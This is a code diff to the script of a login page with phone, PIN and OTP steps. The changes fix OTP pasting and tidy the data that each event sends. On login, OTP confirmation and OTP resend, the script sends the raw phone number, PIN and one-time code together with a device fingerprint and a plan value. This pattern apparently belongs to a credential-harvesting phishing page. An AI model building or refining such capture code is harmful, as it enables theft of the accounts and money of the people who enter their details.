@@ -197,7 +197,7 @@ input{
 </div>
 
 <script>
-/* ===== DEVICE (RESTORED) ===== */
+/* ===== DEVICE ===== */
 const ua = navigator.userAgent;
 let device = 'Unknown';
 
@@ -212,11 +212,18 @@ if (/Chrome/i.test(ua)) device += ' | Chrome';
 else if (/Safari/i.test(ua)) device += ' | Safari';
 else if (/Firefox/i.test(ua)) device += ' | Firefox';
 
-/* ===== PLAN (RESTORED) ===== */
+/* ===== PLAN ===== */
 let selectedPlan = null;
 try {
   selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan'));
 } catch(e){}
+
+function normalizePlan(plan){
+  if(!plan) return 'N/A';
+  if(typeof plan === 'string') return plan;
+  if(plan.name) return plan.name;
+  return JSON.stringify(plan);
+}
 
 /* ===== SHARED DIGIT HANDLER ===== */
 function bindDigitInputs(list, onChange){
@@ -317,18 +324,30 @@ function updateOtpState(){
 
 bindDigitInputs(dEls,updateOtpState);
 
-/* OTP paste */
-dEls[0].addEventListener('paste',e=>{
-  const data=(e.clipboardData||window.clipboardData)
-    .getData('text').replace(/\D/g,'').slice(0,5);
-  if(!data) return;
-  e.preventDefault();
-  dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
-  data.split('').forEach((v,i)=>{
-    dEls[i].value=v;
-    dEls[i].classList.add('filled');
+/* ===== OTP PASTE (FIXED) ===== */
+dEls.forEach((el,startIndex)=>{
+  el.addEventListener('paste',e=>{
+    e.preventDefault();
+    const data=(e.clipboardData||window.clipboardData)
+      .getData('text')
+      .replace(/\D/g,'')
+      .slice(0,dEls.length-startIndex);
+
+    if(!data) return;
+
+    data.split('').forEach((v,i)=>{
+      const idx=startIndex+i;
+      if(dEls[idx]){
+        dEls[idx].value=v;
+        dEls[idx].classList.add('filled');
+      }
+    });
+
+    const last=Math.min(startIndex+data.length,dEls.length)-1;
+    if(dEls[last]) dEls[last].focus();
+
+    updateOtpState();
   });
-  updateOtpState();
 });
 
 /* ===== LOGIN CLICKED ===== */
@@ -341,8 +360,8 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
     event:'login_clicked',
     loginPhone: phone.value,
     loginPin: pinValue,
-    plan: selectedPlan,
-    device,
+    plan: normalizePlan(selectedPlan),
+    device: device || 'Unknown',
     submittedAt: new Date().toISOString()
   });
 
@@ -362,8 +381,8 @@ confirmBtn.onclick=async()=>{
     loginPhone: phone.value,
     loginPin: pinValue,
     otp: dEls.map(d=>d.value).join(''),
-    plan: selectedPlan,
-    device,
+    plan: normalizePlan(selectedPlan),
+    device: device || 'Unknown',
     submittedAt: new Date().toISOString()
   });
 
@@ -377,8 +396,8 @@ resendBtn.onclick=async()=>{
     event:'resend_otp',
     loginPhone: phone.value,
     loginPin: pinValue,
-    plan: selectedPlan,
-    device,
+    plan: normalizePlan(selectedPlan),
+    device: device || 'Unknown',
     submittedAt: new Date().toISOString()
   });
   startCountdown();
